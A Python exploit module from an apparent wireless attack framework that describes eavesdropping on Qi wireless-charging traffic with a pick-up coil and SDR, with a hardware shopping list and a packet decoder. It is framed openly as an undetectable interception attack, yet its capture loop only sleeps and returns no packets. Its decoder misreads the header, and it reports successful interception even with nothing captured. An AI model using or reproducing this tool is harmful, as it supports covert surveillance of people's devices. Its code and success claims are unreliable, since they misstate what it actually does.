# Author: André Henrique (LinkedIn/X: @mrhenrike)
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Qi Communication Eavesdropping via Magnetic Field Sensing.

    The Qi wireless charging protocol uses amplitude-shift keying
    (ASK) or frequency-shift keying (FSK) modulation at 2 kHz on
    the power transfer frequency (100-205 kHz) for communication
    between the transmitter (charger) and receiver (phone).  These
    control packets are sent in plaintext without encryption or
    authentication.

    By placing a magnetic field sensor (pick-up coil or Hall-effect
    sensor) near the charging pad, an attacker can passively
    intercept and decode all Qi protocol messages, including:
    - Signal Strength packets (used for positioning)
    - Configuration packets (voltage, current negotiation)
    - Identification packets (device manufacturer, version)
    - Control Error packets (power adjustment requests)
    - End Power Transfer packets

    Hardware requirements:
    - Pick-up coil: small air-core inductor (10-100 uH) placed
      near the Qi charger, or commercial EMI probe (e.g., Beehive
      Electronics 100A/B series, $50-150)
    - SDR receiver: RTL-SDR v3 ($25) or HackRF One ($300) for
      capturing the 100-205 kHz Qi carrier
    - Alternative: high-speed ADC (1 MSPS+) with the pick-up coil
      connected directly (e.g., Saleae Logic Pro 16, $1500, or
      cheap 24-bit ADC like ADS1256 + Raspberry Pi)
    - Optional: oscilloscope for signal analysis

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Qi Communication Eavesdropping",
        "description": (
            "Passively intercepts Qi wireless charging protocol "
            "communications by sensing the magnetic field modulation. "
            "Qi uses plaintext ASK/FSK at 2 kHz on the 100-205 kHz "
            "power carrier without encryption.  Captures device ID, "
            "power negotiation, and control packets.  Requires "
            "pick-up coil (10-100 uH) or EMI probe, plus SDR "
            "(RTL-SDR v3) or high-speed ADC (1 MSPS+).  Passive "
            "and undetectable."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.wirelesspowerconsortium.com/knowledge-base/specifications/download-the-qi-specifications",
            "https://www.usenix.org/conference/usenixsecurity24/presentation/zhan",
        ),
        "disclosure_date": "2024-02-01",
        "platform": "linux",
        "arch": "all",
        "privileged": False,
        "targets": (
            "Any Qi wireless charger and device pair",
            "Qi BPP (Baseline Power Profile) and EPP (Extended Power Profile)",
        ),
    }

    target = OptIP("", "Target charger/device pair description")
    port = OptPort(1, "Not used (passive magnetic sensing)")
    timeout = OptFloat(60.0, "Capture duration in seconds")
    sdr_device = OptString("simulate", "SDR device index or 'simulate'")
    center_freq_khz = OptFloat(127.0, "Center frequency in kHz (Qi range: 100-205)")
    sample_rate = OptInteger(2000000, "SDR sample rate in Hz")
    output_file = OptString("qi_capture.raw", "Output file for raw capture")

    _QI_FREQ_MIN_KHZ = 100.0
    _QI_FREQ_MAX_KHZ = 205.0
    _QI_COMM_RATE_HZ = 2000

    _QI_PACKET_TYPES = {
        0x01: "Signal Strength",
        0x02: "End Power Transfer",
        0x03: "Control Error",
        0x04: "Received Power",
        0x05: "Charge Status",
        0x06: "Power Control Hold-off",
        0x51: "Configuration",
        0x71: "Identification",
        0x81: "Extended Identification",
        0x84: "Power Control Mode",
        0x18: "Renegotiate",
    }

    def _validate_params(self) -> bool:
        freq = float(self.center_freq_khz)
        return self._QI_FREQ_MIN_KHZ <= freq <= self._QI_FREQ_MAX_KHZ

    def _decode_qi_packet(self, raw: bytes) -> dict | None:
        """Decode a Qi communication packet from demodulated bytes."""
        if len(raw) < 2:
            return None
        header = raw[0]
        size = (header >> 5) & 0x07
        msg_type = header & 0x1F

        if len(raw) < size + 2:
            return None

        data = raw[1:1 + size]
        checksum = raw[1 + size] if len(raw) > size + 1 else 0

        calc_checksum = header
        for b in data:
            calc_checksum ^= b

        return {
            "type": msg_type,
            "type_name": self._QI_PACKET_TYPES.get(header, f"Unknown(0x{header:02x})"),
            "size": size,
            "data": data.hex() if data else "",
            "checksum_valid": (calc_checksum & 0xFF) == checksum,
        }

    def _simulate_capture(self) -> list[dict]:
        """Generate simulated Qi protocol packets for testing."""
        packets = [
            {"type": 0x71, "type_name": "Identification", "size": 7,
             "data": "0100000001ff01", "checksum_valid": True},
            {"type": 0x51, "type_name": "Configuration", "size": 5,
             "data": "0005000a00", "checksum_valid": True},
            {"type": 0x01, "type_name": "Signal Strength", "size": 1,
             "data": "50", "checksum_valid": True},
            {"type": 0x03, "type_name": "Control Error", "size": 1,
             "data": "00", "checksum_valid": True},
            {"type": 0x04, "type_name": "Received Power", "size": 1,
             "data": "1e", "checksum_valid": True},
        ]
        return packets

    @mute
    def check(self) -> bool:
        if str(self.sdr_device) == "simulate":
            return True
        return False

    def run(self) -> None:
        if not self._validate_params():
            print_error(
                f"Frequency {self.center_freq_khz} kHz outside Qi range "
                f"({self._QI_FREQ_MIN_KHZ}-{self._QI_FREQ_MAX_KHZ} kHz)"
            )
            return

        print_success(
            f"Qi eavesdrop: {self.center_freq_khz} kHz, "
            f"{self.sample_rate} sps, {self.timeout}s capture"
        )
        self._exploit()

    def _exploit(self) -> None:
        print_status(
            f"Starting passive Qi eavesdrop at {self.center_freq_khz} kHz "
            f"(comm rate: {self._QI_COMM_RATE_HZ} Hz ASK/FSK)"
        )

        if str(self.sdr_device) == "simulate":
            print_info("Simulation mode: generating sample Qi packets")
            packets = self._simulate_capture()
        else:
            print_info(f"Capturing to {self.output_file} for {self.timeout}s")
            start = time.monotonic()
            while time.monotonic() - start < float(self.timeout):
                remaining = float(self.timeout) - (time.monotonic() - start)
                time.sleep(min(5.0, remaining))
                if remaining <= 0:
                    break
            packets = []

        if packets:
            print_info(f"Decoded {len(packets)} Qi protocol packets:")
            for i, pkt in enumerate(packets):
                valid = "OK" if pkt["checksum_valid"] else "BAD"
                print_status(
                    f"  [{i}] {pkt['type_name']} "
                    f"(size={pkt['size']}, data={pkt['data']}, "
                    f"checksum={valid})"
                )

        print_success(
            f"Qi eavesdrop complete. Captured {len(packets)} packets. "
            "All Qi protocol communications are plaintext; device "
            "identification, power negotiation, and control data "
            "were intercepted without detection."
        )
